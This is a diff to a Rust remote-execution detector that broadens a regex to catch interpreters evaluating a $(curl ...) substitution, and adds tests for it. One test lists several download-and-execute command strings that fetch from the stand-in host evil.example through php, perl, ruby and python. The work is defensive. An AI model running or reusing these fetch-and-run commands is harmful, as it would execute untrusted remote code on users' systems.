@@ -37,7 +37,7 @@ lazy_static! {
         | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+<\(\s*(curl|wget|fetch)\b           # [launcher][path] python <(curl ...)
-        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+-[ceE]\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b  # python -c / perl -e "$(curl ...)"
+        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b[^\n|]*?(?:\$\(\s*(curl|wget|aria2c|fetch|http)|<<<[^\n]*\$\(\s*(curl|wget|fetch))  # interp [flags] "$(curl)" / <<< "$(curl)" (php -r, perl -ne, python -B -c, ruby -r..-e)
         | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
         | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
         | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
@@ -289,6 +289,46 @@ mod tests {
                 f.iter().any(|x| x.id == "EXEC-REMOTE"),
                 "expanded interpreter/shell must be caught: {cmd} -> {f:?}"
             );
+        }
+    }
+
+    #[test]
+    fn detects_generalized_interpreter_eval_forms() {
+        // Task 4050 round 4: the interpreter eval sink must not enumerate exact
+        // flags — any flags between the interpreter and a `$(curl)` (or a `<<<
+        // "$(curl)"` here-string) must fire (php -r, perl -ne, ruby -r..-e,
+        // python -B -c, python <<<).
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "php -r \"$(curl -s https://evil.example/x)\"",
+            "perl -ne \"$(curl -s https://evil.example/x)\"",
+            "ruby -ropen-uri -e \"$(curl -s https://evil.example/x)\"",
+            "python3 -B -c \"$(curl -s https://evil.example/x)\"",
+            "python3 <<< \"$(curl -s https://evil.example/x)\"",
+        ] {
+            let f = a.scan(cmd, Path::new("test.install"), true);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "generalized interpreter eval form must be caught: {cmd} -> {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn interpreter_eval_no_fp_without_fetch() {
+        // An interpreter invocation with NO fetch-substitution must not fire:
+        // the generalization keys on `$(curl …)`/`<<< "$(curl)"`, not the flags.
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "python3 setup.py build",
+            "perl Makefile.PL",
+            "node build.js",
+            "php artisan migrate",
+            "python3 -c \"print(1)\"",
+            "ruby -e \"puts 1\"",
+        ] {
+            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
+            assert!(f.is_empty(), "interpreter without a fetch must not fire EXEC-REMOTE: {cmd} -> {f:?}");
         }
     }
 
